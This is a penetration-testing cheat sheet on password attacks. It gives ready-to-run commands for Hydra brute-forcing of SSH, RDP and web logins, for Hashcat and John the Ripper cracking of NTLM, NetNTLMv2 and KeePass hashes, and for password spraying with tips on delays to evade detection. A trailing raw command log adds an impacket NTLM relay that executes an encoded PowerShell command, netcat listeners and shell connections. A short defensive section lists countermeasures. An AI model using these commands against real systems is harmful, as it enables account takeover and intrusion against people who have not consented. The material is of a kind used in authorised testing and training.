 # Password Attacks

This document covers various password attack techniques used during penetration testing and security assessments. Password attacks are critical for testing authentication mechanisms and identifying weak credentials.

## Table of Contents
- [Password Attack Types](#password-attack-types)
- [Password Cracking Tools](#password-cracking-tools)
  - [Hydra](#hydra)
  - [Hashcat](#hashcat)
  - [John the Ripper](#john-the-ripper)
- [Password Spraying](#password-spraying)
- [Password Hash Types](#password-hash-types)
- [Password Policy Testing](#password-policy-testing)
- [Defensive Countermeasures](#defensive-countermeasures)
- [Useful Wordlists](#useful-wordlists)

## Password Attack Types

### 1. Brute Force Attack
- Trying all possible combinations of characters until the correct password is found
- Time-consuming but thorough

### 2. Dictionary Attack
- Uses a wordlist of common passwords
- Much faster than brute force
- Success depends on the quality of the wordlist

### 3. Hybrid Attack
- Combines dictionary words with additional characters
- Example: appending numbers (password1, password123) or special characters (password!)

### 4. Rule-based Attack
- Applies transformation rules to dictionary words
- Common rules include:
  - Capitalization (password → Password, PASSWORD)
  - Leet speak (password → p4ssw0rd)
  - Appending/prepending numbers or special characters

## Password Cracking Tools

### Hydra

Hydra is a parallelized login cracker that supports numerous protocols.

#### Basic Syntax
```bash
hydra -l <username> -P <wordlist> <protocol>://<target>[:port]
```

#### Common Use Cases

**SSH Brute Force**
```bash
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.1.1 -t 4 -vV
# -s: port number
# -t: number of parallel tasks
# -vV: verbose output
```

**RDP Attack**
```bash
hydra -L users.txt -p "SuperS3cure1337#" rdp://192.168.1.1
```

**HTTP POST Form Attack**
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.1.1 http-post-form 
"/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

### Hashcat

Hashcat is a powerful password recovery tool that supports multiple hash types.

#### Basic Syntax
```bash
hashcat -m <hash_type> <hash_file> <wordlist> [options]
```

#### Common Hash Types
- 0: MD5
- 1000: NTLM
- 1800: SHA-512 (Unix)
- 13400: KeePass
- 5600: NetNTLMv2

#### Common Use Cases

**Basic Dictionary Attack**
```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Rule-based Attack**
```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
```

**Mask Attack (Advanced)**
```bash
# ?l = lowercase, ?u = uppercase, ?d = digit, ?s = special
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?d?d?d?
```

### John the Ripper

John is another powerful password cracker with built-in wordlists and rules.

#### Basic Syntax
```bash
john --format=<format> --wordlist=<wordlist> <hash_file>
```

#### Common Use Cases

**Basic Dictionary Attack**
```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

**Incremental Mode (Brute Force)**
```bash
john --incremental=alnum hashes.txt
```

## Password Spraying

Password spraying is an attack that tries a single password against multiple accounts to avoid account lockout policies.

### Key Considerations
- **Account Lockout Policies**: Check if account lockout is enabled before spraying
- **Timing**: Add delays between attempts to avoid detection
- **Common Passwords**: Use common passwords that might be in use (e.g., SeasonYear!)

### Tools for Password Spraying

#### 1. Kerbrute
```bash
# Basic password spray
kerbrute passwordspray -d domain.local -u users.txt -p 'Spring2023!' <domain_controller_ip>

# With delay between attempts
kerbrute passwordspray -d domain.local -u users.txt -p 'Spring2023!' --delay 10s <domain_controller_ip>
```

#### 2. Spray
```bash
# SMB password spray
spray.sh -t 10 -w 5 -d 30 -f users.txt -p 'Company123!' smb 192.168.1.1

# RDP password spray
spray.sh -t 10 -w 5 -d 30 -f users.txt -p 'Company123!' rdp 192.168.1.1
```

#### 3. MSFConsole (Metasploit)
```bash
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.1
set USER_FILE users.txt
set PASS_FILE passwords.txt
set STOP_ON_SUCCESS true
set BLANK_PASSWORDS false
set DB_ALL_CREDS true
run
```

### Defensive Measures Against Spraying
1. **Account Lockout Policies**: Implement account lockout after a few failed attempts
2. **Multi-Factor Authentication**: Require MFA for all user accounts
3. **Monitoring**: Set up alerts for multiple failed login attempts across accounts
4. **Password Policies**: Enforce strong password policies to prevent common passwords
5. **Impossible Travel Detection**: Monitor for logins from different geographic locations in a short time

---------------------------------------------------------------------
nmap -sV -p 2222 1.1.1.1
---------------------------------------------------------------------
cd /usr/share/wordlists/
---------------------------------------------------------------------
sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://1.1.1.1
---------------------------------------------------------------------
sudo hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://1.1.1.1
---------------------------------------------------------------------
sudo hydra -l user -P /usr/share/wordlists/rockyou.txt 1.1.1.1 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
---------------------------------------------------------------------
hashcat -b
---------------------------------------------------------------------
ls -la /usr/share/hashcat/rules/
---------------------------------------------------------------------
hashcat -m 0 crack.txt /usr/share/wordlists/rockyou.txt -r demo.rule --force
---------------------------------------------------------------------
hashcat --help | grep -i "KeePass"
---------------------------------------------------------------------
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
---------------------------------------------------------------------
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
---------------------------------------------------------------------
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
---------------------------------------------------------------------
hostname
---------------------------------------------------------------------
ipconfig
---------------------------------------------------------------------
whoami
---------------------------------------------------------------------
nc 1.1.1.1 4444
---------------------------------------------------------------------
whoami
---------------------------------------------------------------------
net user 
---------------------------------------------------------------------
ip -a 
---------------------------------------------------------------------
dir  \\1.1.1.1\test
---------------------------------------------------------------------
 cat paul.hash
---------------------------------------------------------------------
hashcat --help | grep -i "ntlm"
---------------------------------------------------------------------
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
---------------------------------------------------------------------
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 1.1.1.1 -c "powershell -enc "
---------------------------------------------------------------------
nc -nvlp 8080
---------------------------------------------------------------------
nc 1.1.1.1 5555
---------------------------------------------------------------------